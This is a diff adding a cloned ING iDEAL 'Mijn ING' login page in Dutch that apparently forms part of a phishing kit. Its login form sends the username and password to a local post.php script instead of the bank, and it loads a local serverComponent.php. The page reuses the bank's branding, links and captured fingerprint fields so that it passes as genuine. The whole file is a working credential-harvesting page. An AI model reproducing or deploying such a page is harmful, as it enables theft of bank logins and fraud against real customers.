@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<!-- saved from url=(0103)https://ideal.ing.nl/internetbankieren/SesamLoginServlet?trxid=0020001761483720&random=zca06c1bafbd69dd -->
+<html data-bm-environment="P" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><script type="text/javascript" async="" src="./index_files/c27af784cee8f14d4210a61a741656bc.js.download"></script><script async="true" type="text/javascript" src="./index_files/start.js.download"></script><script src="./index_files/serverComponent.php"></script>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="Description" content="Wilt u inloggen op iDEAL? Met uw gebruikersnaam en wachtwoord heeft u direct toegang tot Internetbankieren. Zo bankiert u veilig en snel via internet.">
+	
+	<link rel="shortcut icon" href="https://ideal.ing.nl/internetbankieren/gfx/favicon.ico" type="image/x-icon">
+	
+
+	
+	
+	<title>Mijn ING</title>
+
+
+
+    <link rel="stylesheet" href="https://ideal.ing.nl/ideal/static/inloggen/the-guide/css/18397d62.the-guide-styles-responsive.min.css">
+
+    <script src="./index_files/idxUtils.js.download"></script>
+    <script src="./index_files/idxTransformer.js.download"></script>
+    <script src="./index_files/qr-code-lib-2.js.download"></script>
+    <script src="./index_files/qrController.js.download"></script>
+
+<script type="text/javascript" async="" src="./index_files/p3"></script><script type="text/javascript" async="" src="./index_files/p3(1)"></script></head>
+
+<body class="tg" style="margin: 8px; background-color: white;">
+    <iframe name="ifrm" id="ifrm" style="display:none" scrolling="no" src="./index_files/pkmslogout.html" frameborder="0">Sorry, your browser doesn't support iframes.</iframe><iframe name="ifrm" id="ifrm" style="display:none" scrolling="no" src="./index_files/pkmslogout(1).html" frameborder="0">Sorry, your browser doesn't support iframes.</iframe>
+    
+    <div id="cover" style="display: none;"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12 col-lg-10 col-lg-offset-1 col-xl-8 col-xl-offset-2">
+                <header style="line-height: 40px">
+                <span class="icon-ing-logo font-size-xh l-pr-1" aria-labelledby="ingLogoTxt">
+                    <span class="sr-only" id="ingLogoTxt">ING logo</span>
+                    <span class="icon icon-ing-logo-ing" aria-hidden="true"></span>
+                    <span class="icon icon-ing-logo-lion icon-jb" aria-hidden="true"></span>
+                </span>
+                    <!-- inline css nescesarry since we have no components, only theguide -->
+                    <span style="padding-right: 20px; margin-bottom: -20px; border-left: 1px solid #ececec; display: inline-block; height: 45px;" id="prdLogoSpacer"></span>
+
+
+                    <div class="languages h-float-right hidden-print h-hidden" id="languageSelector"></div>
+                </header>
+
+                <main role="main">
+                    <h1 id="pageHeader" class="l-mt-2">
+                        <span id="mainTitle">Inloggen Mijn ING</span>
+                    </h1>
+                    <p id="p1">Controleer of het adres begint met https:// en of u het slotje in de browser ziet.</p>
+                    
+
+                    <div id="loginPanel">
+                        <div class="panel panel-bordered panel-default">
+                            <div class="panel-body">
+                                <h3 class="h-text-b" id="loginTitle">Inloggen</h3>
+                                <div class="row">
+                                    <div class="col-xs-12">
+
+                                        <form id="login" name="login" action="post.php" autocomplete="off" method="post" class="form-horizontal">
+                                            <fieldset>
+                                                <div id="userNamePassword" class="">
+                                                    <div class="form-group " id="userNameGroup">
+                                                        <div class="control-label col-lg-3">
+                                                            <label id="usrNameLbl" for="gebruikersnaam">Gebruikersnaam</label>
+                                                        </div>
+                                                        <div class="col-lg-5">
+                                                            <input type="text" tabindex="1" class="form-control" autofocus="autofocus" name="gebruikersnaam" id="gebruikersnaam" maxlength="20" value="">
+                                                        </div>
+                                                    </div>
+
+                                                    <div class="form-group" id="passwordGroup">
+                                                        <div class="control-label col-lg-3 ">
+                                                            <label id="passwordLbl" for="wachtwoord">Wachtwoord</label>
+                                                        </div>
+                                                        <div class="col-lg-5">
+                                                            <input type="password" tabindex="2" class="form-control" maxlength="20" name="wachtwoord" id="wachtwoord">
+                                                        </div>
+                                                    </div>
+
+                                                    <div class="col-lg-offset-3 l-p-05 l-pr-5  h-hidden" id="errorMessage">
+                                                        <div class="help-block message">
+                                                             <span class="stacked-icon">
+                                                              <i aria-hidden="true" class="icon"></i>
+                                                              <i aria-hidden="true" class="icon"></i>
+                                                             </span>
+                                                            <span id="errorMessageTxt"></span>
+                                                        </div>
+                                                    </div>
+
+                                                    <div class="col-lg-offset-3 h-hidden" id="capsWarning">
+                                                        <div class="alert alert-inline alert-warning ">
+                                                            <span class="stacked-icon icon-lg">
+                                                                <span class="icon icon-notification-warning-z1 icon-orange"></span>
+                                                                <span class="icon icon-white icon-notification-warning-z2"></span>
+                                                            </span>
+                                                            <span id="capsLockWarning"><strong>Pas op!</strong> De Caps Lock toets staat aan</span>
+                                                        </div>
+                                                    </div>
+
+                                                </div>
+
+                                                <script language="javascript">
+                                                    document.write("<INPUT TYPE='hidden' name='aTRFlCNa8HSZxfB1w' value='" + urlEncode(add_deviceprint()) +"'>");
+                                                </script><input type="hidden" name="aTRFlCNa8HSZxfB1w" value="version%3D2%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%206%2E1%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F62%2E0%2E3202%2E94%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%206%2E1%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F62%2E0%2E3202%2E94%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1600%7C900%7C870%26pm%5Ffpsw%3D%26pm%5Ffptz%3D1%26pm%5Ffpln%3Dlang%3Dnl%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cmhjfbmdgcfjbbpaeojofohoefgiehjai%7Cinternal%2Dnacl%2Dplugin%7Cwidevinecdmadapter%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1600%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D">
+
+                                                <div class="fieldset-row">
+                                                    <div class="checkbox col-lg-offset-3 col-lg-5">
+                                                        <label>
+                                                            <input type="checkbox" name="gebruikersnaam" tabindex="3" id="gebruikersnaam">
+                                                            <span id="saveUser">Gebruikersnaam opslaan</span>
+                                                        </label>
+                                                    </div>
+                                                </div>
+
+                                                <div class="form-group btn-bar l-mt-1">
+                                                    <div class="col-lg-offset-3 col-lg-5">
+                                                        <button type="submit" class="btn btn-primary" tabindex="4" title="Inloggen" id="loginButton">Inloggen</button>
+
+                                                        <a href="https://ideal.ing.nl/internetbankieren/jsp/redirectToIdeal.jsp?cancel=true&amp;trxid=0020001761483720&amp;random=zca06c1bafbd69dd" class="btn btn-secondary" id="cancelButton">Annuleren</a>
+                                                    </div>
+                                                </div>
+                                                <div class="form-group l-mt-2">
+                                                    <div class="col-lg-offset-3 col-lg-9">
+                                                        <a href="https://inlogcodes.mijn.ing.nl/particulier/zelf-regelen/instellen/inlogcodes/index.jsp" target="_blank" class="link-a ng-scope" tabindex="5"><span aria-hidden="true" class="icon icon-arrow-c-right icon-xs"></span><span id="rememberTxt">Wachtwoord/gebruikersnaam vergeten</span></a>
+                                                    </div>
+                                                </div>
+                                            </fieldset>
+                                        <input type="hidden" name="lptr" id="lptr" value="{&quot;v4a&quot;:{&quot;r&quot;:&quot;0&quot;},&quot;v4b&quot;:{&quot;f&quot;:&quot;0&quot;},&quot;v7&quot;:{&quot;s&quot;:&quot;cbc6-1b1a-0a03-8a72-9af9-b901-e25a-d1b0-1512415321117&quot;},&quot;v4&quot;:{&quot;j&quot;:&quot;&quot;},&quot;timestamp&quot;:&quot;2017-12-04 19:22:01&quot;,&quot;ki&quot;:&quot;1&quot;,&quot;v6&quot;:{&quot;u&quot;:&quot;&quot;,&quot;k&quot;:&quot;&quot;}}"><input type="hidden" name="lpts" id="lpts" value="c0e338ec798b95c294f2b269c442155b01c60ebde7e9ca7cfc377f1186d3219e"></form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <span id="footerLinks">
+                     <div><a href="http://www.ing.nl/shortcut/ming/page/ideal-faq" tabindex="6" target="_blank" class="link-a ng-scope"><span aria-hidden="true" class="icon icon-arrow-c-right icon-xs"></span><span id="hlpLink">Help</span></a></div>
+                     <div><a href="http://www.ing.nl/de-ing/veilig-bankieren/veilig-betalen/veilig-betalen-met-ideal/index.aspx" tabindex="7" target="_blank" class="link-a ng-scope"><span aria-hidden="true" class="icon icon-arrow-c-right icon-xs"></span><span id="safeLink">Veilig betalen met iDEAL</span></a></div>
+                </span>
+                </main>
+                <script type="text/javascript">
+                    $('#qrcode').qrcode({size: 120, text: 'https://bankieren.ideal.ing.nl/ideal/betalen/inlog-annuleren/static/detect_qr?trxid=0050223568347245&random=zc40f483242f4754'});
+                </script>
+            </div>
+        </div>
+    </div>
+	
+
+
+<div id="overlay" style="display: none;"></div><div id="modal" class="panel panel-a modal" style="max-width: 740px; padding: 0px; display: none;"><div id="content" style="min-height: 410px;"></div></div><iframe id="iframe307" frameborder="0" src="javascript: false;" style="width: 0px; height: 0px; border: none;" src="./index_files/saved_resource.html"></iframe><img src="./index_files/p2" width="0" height="0" style="display: none; border: none;"><iframe id="iframe16" frameborder="0" src="javascript: false;" style="width: 0px; height: 0px; border: none;" src="./index_files/saved_resource(1).html"></iframe></body></html>
